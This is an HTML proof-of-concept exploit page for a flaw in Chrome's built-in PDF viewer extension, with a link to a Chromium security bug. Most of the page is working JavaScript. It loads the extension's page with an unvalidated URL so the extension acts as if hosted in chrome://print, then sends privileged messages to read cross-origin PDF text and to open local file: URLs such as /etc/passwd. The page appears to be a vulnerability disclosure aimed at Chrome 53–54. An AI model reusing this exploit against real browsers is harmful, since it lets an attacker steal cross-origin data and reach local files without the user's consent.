<body>
    The built-in extension that loads PDFs exposes a page where an arbitrary URL can be set. The extension does not validate
    this URL. As a result, the plugin can be tricked into believing that it is hosted in privileged pages (e.g.
    <code>chrome://print</code>) and execute privileged functionality.

    <h2>Example: Read cross-origin PDF data</h2>
    <button onclick="viewCrossOriginPDF()">Show content of cross-origin PDF (e.g. Bitcoin paper)</button>

    <h2>Example: Open a file:-URL</h2>
    file:-URLs are normally not accessible from the web. This test bypasses all checks and opens any file:-URL in Chrome 53.
    In Chrome 54+, this implementation of the exploit fails because
    <code>chrome://print</code> cannot directly be loaded in the helper extension, and I did not bother with looking for work-arounds.
    <button onclick="openFileUrl()">Open file URL</button>
    <!-- https://bugs.chromium.org/p/chromium/issues/detail?id=654280&can=1&q=Type%3DBug-Security%20CVE%20status%3AFixed%20&colspec=ID%20Pri%20M%20Stars%20ReleaseBlock%20Component%20Status%20Owner%20Summary%20OS%20Modified&start=200 -->

    <script>
        const getPdfData = urlToOpen => `%PDF-1.4
1 0 obj<</Type/Catalog/Pages<<>>
/OpenAction<<
/Type/Action
/S/URI
/URI (${urlToOpen})
>>>>endobj
trailer
<</Root 1 0 R>>
`;

        function stringToUrl(str) {
            return 'data:application/pdf,' + encodeURIComponent(str);
            // Does not need to be a Blob URL, but this allows for a self-contained PoC.
            return URL.createObjectURL(new Blob([str]));
        }

        function setupExploit(unvalidatedUrl) {
            var tmpWin;
            return new Promise(resolve => {
                console.log('Step 1: Initialize OOP PDF plugin');

                // In Chrome 53 (with --isolate-extensions) and Chrome 54, just opening an iframe is sufficient.
                // In the latest tree (55.0.2882.0, 56.0.2886.0), it should be opened in a new tab.
                var isChrome54andEarlier = /Chrome\/5[0-4]/.test(navigator.userAgent);
                if (isChrome54andEarlier) {
                    var f = document.createElement('iframe');
                    f.src = 'data:application/pdf,';
                    document.body.appendChild(f);
                    f.onload = f.onerror = () => resolve();
                    return;
                }
                tmpWin = window.open('data:application/pdf,');
                resolve();
            })
                .then(() => new Promise(resolve => {
                    console.log('Step 2: Load privileged page that blindly accepts any input');
                    var f = document.createElement('iframe');
                    f.src = 'chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/index.html?' + unvalidatedUrl;
                    document.body.appendChild(f);
                    f.onload = () => {
                        if (tmpWin) {
                            tmpWin.close();
                        }
                        resolve(f);
                    };
                }));
        }

        function openFileUrl() {
            var urlToOpen = navigator.userAgent.includes('Windows') ? 'file:////C:\\' : 'file:///etc/passwd';
            urlToOpen = 'https://example.com';
            var anyPdfUrl = stringToUrl(getPdfData(urlToOpen));
            console.log(anyPdfUrl);

            setupExploit('chrome://print').then(f => {
                console.log('Step 3: Example of abusing privileged messages (open file:-URL).');
                f.contentWindow.postMessage({
                    type: 'resetPrintPreviewMode',
                    url: anyPdfUrl,
                    grayscale: false,
                    modifiable: false,
                }, '*');
            });
        }
        function viewCrossOriginPDF() {
            var redirectingUrl = new URL('/REDIRECT/https://bitcoin.org/bitcoin.pdf', location.href);
            setupExploit(redirectingUrl).then(f => {
                console.log('Step 3: Example of abusing privileged messages (cross-origin PDF read).');

                window.onmessage = function (event) {
                    if (event.data.type === 'getSelectedTextReply') {
                        var pre = document.createElement('pre');
                        pre.textContent = event.data.selectedText || 'No text selected';
                        document.body.appendChild(pre);
                    }
                }
                f.contentWindow.postMessage({ type: 'selectAll' }, '*');
                f.contentWindow.postMessage({ type: 'getSelectedText' }, '*');
            });
        }
    </script>